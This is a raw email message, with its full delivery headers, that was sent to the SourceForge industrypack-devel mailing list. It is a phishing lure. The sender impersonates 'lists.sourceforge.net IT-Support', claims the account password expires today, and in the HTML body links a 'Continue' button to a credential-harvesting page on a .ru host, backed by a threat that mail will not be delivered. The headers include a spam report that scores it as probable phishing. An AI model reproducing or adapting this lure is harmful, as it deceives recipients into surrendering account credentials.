Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 12C3046654A
	for <lists+industrypack-devel@lfdr.de>; Thu,  2 Dec 2021 15:32:22 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1msn8G-0000PI-Lj
	for lists+industrypack-devel@lfdr.de; Thu, 02 Dec 2021 14:32:20 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <notice@sin-ou.co.jp>) id 1msn8E-0000PC-Rt
 for industrypack-devel@lists.sourceforge.net; Thu, 02 Dec 2021 14:32:18 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=axWYpn7lofbox2cGCSnYG4DIS+zDZC0arhzdFMJpReQ=; b=Zfft6MfFkKjmM6koBV0W5u7Nk8
 PAIK0u6fsyaajZWsjRTF9lkItJN+RVdtPhV9zFFql3nl039OQZ3HjA8mu9XCTQi7LlttEHCepUEpk
 sGTNYI6o3eNtBM0Wj2tgkVbT6D2LgHNp89frk31Efa4/85B9ir9NlRE+Kwdvtdj8aCug=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=axWYpn7lofbox2cGCSnYG4DIS+zDZC0arhzdFMJpReQ=; b=I
 tobiDwR6mTAmiPnGv/zyYjwFX8u11Q+BldsC4GZhSfjpv1Y7XU7I9300qRGIMh3Euxz5QOHU1eoSM
 09hswoFy6GtUMZ9TQKh5zimnEHLnVPcr8YD9elYg+FpyIkIe2NHsIBxt7EQaDFg0q9UuYlMDI9Mvx
 zmjPohBK1ITc3Scc=;
Received: from [64.227.180.51] (helo=mta0.sin-ou.co.jp)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1msn8D-00024w-Qp
 for industrypack-devel@lists.sourceforge.net; Thu, 02 Dec 2021 14:32:18 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=sin-ou.co.jp;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=notice@sin-ou.co.jp;
 bh=axWYpn7lofbox2cGCSnYG4DIS+zDZC0arhzdFMJpReQ=;
 b=hn0fa4Y+EsWBl8evMX34343KazWrsXR8cl3u1wc5317sPskzjQIhejyRRvGMQ3HsN7XtB8OwTrsF
 1kMaXfPCAetrdwS3S6XlOeGruCUj6y/ZjXu0xf7x+R0tM1fnaPLtHqoJ+vIrfRA0zd80+ko3NKlA
 hjeoKKu98aF3nilaruY=
From: Administrator DESK <notice@sin-ou.co.jp>
To: industrypack-devel@lists.sourceforge.net
Date: 02 Dec 2021 06:32:07 -0800
Message-ID: <20211202063207.BB2049228FDE2D59@sin-ou.co.jp>
MIME-Version: 1.0
X-Spam-Score: 4.9 (++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: ID: industrypack-devel@lists.sourceforge.net Your
 industrypack-devel@lists.sourceforge.net
 password expires today 12/2/2021 6:32:07 a.m. Use the button below to continue
 with same password 
 Content analysis details:   (4.9 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: sin-ou.co.jp]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.7 SPF_NEUTRAL            SPF: sender does not match SPF record (neutral)
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 2.6 VFY_ACCT_NORDNS        Verify your account to a poorly-configured MTA -
 probable phishing
 0.0 NORDNS_LOW_CONTRAST    No rDNS + hidden text
X-Headers-End: 1msn8D-00024w-Qp
Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net
 Password expires 12/2/2021 6:32:07 a.m.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5197361912616638215=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5197361912616638215==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.16438"></HEAD>
<body>ID: industrypack-devel@lists.sourceforge.net<BR><BR>Your industrypack=
-devel@lists.sourceforge.net password expires today 12/2/2021 6:32:07 a.m. =
<BR><BR>Use the button below to continue with same password<BR><BR>
<P><A style=3D"FONT-SIZE: 15px; TEXT-DECORATION: none; WIDTH: 10%; BACKGROU=
ND: rgb(11,102,35) 0% 50%; COLOR: white; PADDING-BOTTOM: 15px; TEXT-ALIGN: =
center; PADDING-TOP: 15px; PADDING-LEFT: 15px; DISPLAY: block; PADDING-RIGH=
T: 15px; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-i=
nitial; -moz-background-inline-policy: -moz-initial" href=3D"http://nova.st=
avcsm.ru/ss/index.php?i=3Di&0=3Dindustrypack-devel@lists.sourceforge.net" t=
arget=3D_blank>Continue </A></P>
<P>Note: Your mails may not be delivered until you verify your account.</P>=

<P>Sincerely,</P>
<P>lists.sourceforge.net IT-Support.</P></BODY></HTML>


--===============5197361912616638215==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5197361912616638215==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5197361912616638215==--
